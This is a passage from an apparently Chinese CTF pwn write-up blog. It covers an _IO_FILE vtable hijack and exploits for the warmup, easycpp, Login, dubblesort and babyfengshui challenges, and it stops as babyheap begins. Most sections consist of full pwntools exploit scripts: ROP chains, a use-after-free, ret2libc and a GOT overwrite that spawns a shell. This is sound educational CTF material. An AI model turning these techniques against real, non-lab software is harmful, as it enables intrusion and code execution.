<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>由于_IO_FILE结构体中的vtable指针可以被修改，因此可以指向任意我们伪造好的位置。修改好后，只需要满足<code>fp-&gt;mode &lt;= 0 &amp;&amp; fo-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>即可进行调用，且调试发现该函数参数为结构体的第一个元素值</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x7f671d85e550</span> (_IO_2_1_stderr_+<span class="number">16</span>) ◂— <span class="number">0x0</span></span><br><span class="line">*RBX  <span class="number">0x7f671d85e540</span> (_IO_2_1_stderr_) ◂— <span class="string">&#x27;LookHere&#x27;</span></span><br><span class="line">*RCX  <span class="number">0x7f671d85ec30</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x0</span></span><br><span class="line">*RDI  <span class="number">0x7f671d85e540</span> (_IO_2_1_stderr_) ◂— <span class="string">&#x27;LookHere&#x27;</span></span><br><span class="line">*RSI  <span class="number">0xffffffff</span></span><br><span class="line">*R8   <span class="number">0x4</span></span><br><span class="line">*R9   <span class="number">0x0</span></span><br><span class="line">*R10  <span class="number">0x7fff63e6a548</span> —▸ <span class="number">0x7f671da899d8</span> (_rtld_global+<span class="number">2456</span>) —▸ <span class="number">0x7f671d863000</span> ◂— jg     <span class="number">0x7f671d863047</span></span><br><span class="line">*R11  <span class="number">0x3</span></span><br><span class="line">*R12  <span class="number">0x7f671da86700</span> ◂— <span class="number">0x7f671da86700</span></span><br><span class="line">*R13  <span class="number">0x0</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line">*R15  <span class="number">0x2</span></span><br><span class="line">*RBP  <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fff63e6a568</span> —▸ <span class="number">0x7f671d515196</span> ◂— cmp    eax, -<span class="number">1</span></span><br><span class="line">*RIP  <span class="number">0x7f671d4de390</span> (system) ◂— test   rdi, rdi</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-V-N2020-公开赛-warmup-orw"><a href="#0x02-V-N2020-公开赛-warmup-orw" class="headerlink" title="0x02.[V&amp;N2020 公开赛]warmup( orw )"></a>0x02.[V&amp;N2020 公开赛]warmup( orw )</h3><p><code>checksec</code>看到除了canary，其他都开了</p>
<p><code>seccomp-tools</code>看到禁用了<code>execve</code></p>
<p>程序的缓冲区恰好接上，直接写payload就行</p>
<p>在libc的bss段上写入<code>/bin/sh</code>和<code>flag</code>字符串，直接得到flag</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到libc地址后直接在libc的bss段上进行写，实现orw</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29676</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./vn_pwn_warmup&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_warmup&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift: 0x&#x27;</span>)</span><br><span class="line">puts = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;puts ===&gt; &#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libcbase = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">pop_rdi = libcbase + <span class="number">0x21102</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x202e8</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0x1b92</span></span><br><span class="line">open_ = libcbase + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_ = libcbase + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">libc_buf = libcbase + <span class="number">0x3c5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input something: &#x27;</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(pop_rsi) + p64(libc_buf) + p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(read_)  \</span><br><span class="line">        + p64(pop_rdi) + p64(libc_buf) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(open_) \</span><br><span class="line">        + p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(libc_buf) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_) \</span><br><span class="line">        + p64(pop_rdi) + p64(libc_buf) + p64(puts)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x78</span> + p64(pop_rdi)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x03-minilCTF2020-easycpp-cpp"><a href="#0x03-minilCTF2020-easycpp-cpp" class="headerlink" title="0x03.minilCTF2020 - easycpp( cpp )"></a>0x03.minilCTF2020 - easycpp( cpp )</h3><p><code>checksec</code>看到只开了NX，partial relro，32位</p>
<p>这c++光看着就没有想法了，没系统学，就简单看了看</p>
<p>主函数如下</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  B *v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v3 = (B *)<span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">4u</span>);</span><br><span class="line">  v3-&gt;_vptr_A = <span class="number">0</span>;</span><br><span class="line">  B::<span class="built_in">B</span>(v3);</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v3)</span></span>;</span><br><span class="line">  <span class="built_in">fgets</span>(buf, <span class="number">1024</span>, stdin);</span><br><span class="line">  <span class="built_in">strdup</span>(buf);</span><br><span class="line">  (*v3-&gt;_vptr_A)(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>程序最后的函数调用格外显眼</p>
<p>strdup是会拷贝字符串到分配的内存，而v3对应内存刚好释放，直接写地址就行，程序会直接执行v3所存的地址指向的地址上的代码</p>
<p>gdb调试很容易明白此时的调用逻辑</p>
<p>exp如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#程序会调用二级函数指针，直接动调解决</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./easycpp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">payload = p32(<span class="number">0x804a0c4</span>) + p32(<span class="number">0x80487bb</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="task04"><a href="#task04" class="headerlink" title="task04"></a>task04</h2><h3 id="0x01-ZJCTF-2019-Login-ret2text"><a href="#0x01-ZJCTF-2019-Login-ret2text" class="headerlink" title="0x01.[ZJCTF 2019]Login ( ret2text )"></a>0x01.[ZJCTF 2019]Login ( ret2text )</h3><p><code>checksec</code>看到NX，canary，partial relro</p>
<p>又是一个c++题，程序会有两次输入，一次是username，一次是password，在最后的<code>password_checker</code>函数里面可以看到函数指针</p>
<p><code>password_checker</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">password_checker</span><span class="params">(<span class="type">void</span> (*)(<span class="type">void</span>))</span>::&#123;lambda(<span class="type">char</span> <span class="type">const</span>*,<span class="type">char</span> <span class="type">const</span>*)#<span class="number">1</span>&#125;::operator()(</span><br><span class="line">        <span class="type">void</span> (***a1)(<span class="type">void</span>),</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a2, a3) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">0x50</span>uLL, <span class="string">&quot;Password accepted: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    (**a1)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们首先要通过密码比较，如果不能理解这个函数指针，可以gdb调试，输入一些地址试一试。在输入的过程中，注意要8字节对齐。</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29115)</span></span><br><span class="line">io = process(<span class="string">&#x27;./login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;password: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2jctf_pa5sw0rd\x00A&#x27;</span>+p64(<span class="number">0x400e88</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x02-pwnable-tw-dubblesort-ret2libc"><a href="#0x02-pwnable-tw-dubblesort-ret2libc" class="headerlink" title="0x02.pwnable.tw - dubblesort( ret2libc )"></a>0x02.pwnable.tw - dubblesort( ret2libc )</h3><p>先<code>checksec</code>，保护全开</p>
<p>程序主要逻辑为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__printf_chk(<span class="number">1</span>, <span class="string">&quot;What your name :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x40</span>u);</span><br><span class="line">__printf_chk(<span class="number">1</span>, <span class="string">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v8);</span><br><span class="line">v3 = v8;</span><br><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1</span>, <span class="string">&quot;Enter the %d number : &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, v4);</span><br><span class="line">    v3 = v8;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">sub_931(v9, v3);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Result :&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v8; ++j )</span><br><span class="line">    __printf_chk(<span class="number">1</span>, <span class="string">&quot;%u &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们会先输入name，这个过程可以泄露出栈中数据，栈中会有和libcbase相关的数据，然后输入要排序的数的个数，<code>sub_931</code>是一个排序的函数，v4每次都要加4，但没有增加的边界，因此会产生溢出，我们可以绕过canary来覆盖返回地址，实现ret2libc</p>
<p>exp为：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先利用栈中已有数据泄露libc，然后利用scanf多次读入数据修改返回地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,25178)</span></span><br><span class="line">io = process(<span class="string">&#x27;./dubblesort&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./dubblesort&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name :&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x1c</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x1c</span>)</span><br><span class="line">libcbase = u32(io.recv(<span class="number">4</span>))-<span class="number">0x184be</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;sort :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;35&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(sys).encode())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(bin_sh).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="0x03-babyfengshui-33c3-2016-got-hijack"><a href="#0x03-babyfengshui-33c3-2016-got-hijack" class="headerlink" title="0x03.babyfengshui_33c3_2016( got hijack )"></a>0x03.babyfengshui_33c3_2016( got hijack )</h3><p><code>checksec</code>看到开了NX，canary，partial relro</p>
<p>一个目录题，有增加、删除、打印、修改功能。</p>
<p>在<code>add</code>功能里面可以看到对<code>name</code>的写入长度明显过长，产生溢出</p>
<p>在调试分析之后我们发现程序在<code>add</code>时会产生两个堆块，第一个存储<code>description</code>，第二个存储指向<code>description</code>的指针和<code>name</code>，因此我们要试图利用溢出来控制这个指针，控制后我们就可以泄露<code>libc</code>地址并且修改<code>got</code>表。(<code>one_gadget</code>似乎都无法满足条件)</p>
<p>exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先根据description的大小规则分配释放构造得到指针的控制权，然后修改got表，获得shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,26390)</span></span><br><span class="line">io = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_</span>(<span class="params">descri_size, name, text_size, text</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(descri_size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;text length: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(text_size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;text: &#x27;</span>)</span><br><span class="line">    io.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display_</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_</span>(<span class="params">index, text_size, text</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Action: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;text length: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(text_size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;text: &#x27;</span>)</span><br><span class="line">    io.sendline(text)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x804b010</span></span><br><span class="line"></span><br><span class="line">add_(<span class="number">0x20</span>, <span class="string">b&#x27;AAAA&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;BBBB&#x27;</span>)</span><br><span class="line">add_(<span class="number">0x20</span>, <span class="string">b&#x27;AAAA&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;BBBB&#x27;</span>)</span><br><span class="line">delete_(<span class="number">0</span>)</span><br><span class="line">add_(<span class="number">0x80</span>, <span class="string">b&#x27;AAAA&#x27;</span>, <span class="number">0xd0</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x80</span>+<span class="number">0x28</span>+<span class="number">8</span>-<span class="number">8</span>)+p32(free_got))    <span class="comment">#index_2可以写入到index_1的name指向description的指针</span></span><br><span class="line">display_(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">free = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free ===&gt; &#x27;</span>+<span class="built_in">hex</span>(free))</span><br><span class="line"></span><br><span class="line">libcbase = free - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">update_(<span class="number">1</span>, <span class="number">4</span>, p32(system))</span><br><span class="line">delete_(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="task05"><a href="#task05" class="headerlink" title="task05"></a>task05</h2><h3 id="0x01-babyheap-0ctf-2017-heap-overflow-fastbin-attack"><a href="#0x01-babyheap-0ctf-2017-heap-overflow-fastbin-attack" class="headerlink" title="0x01.babyheap_0ctf_2017( heap_overflow + fastbin attack )"></a>0x01.babyheap_0ctf_2017( heap_overflow + fastbin attack )</h3><p><code>checksec</code>看到保护全开</p>
<p>程序在<code>fill</code>时未检查填充大小，会产生溢出</p>
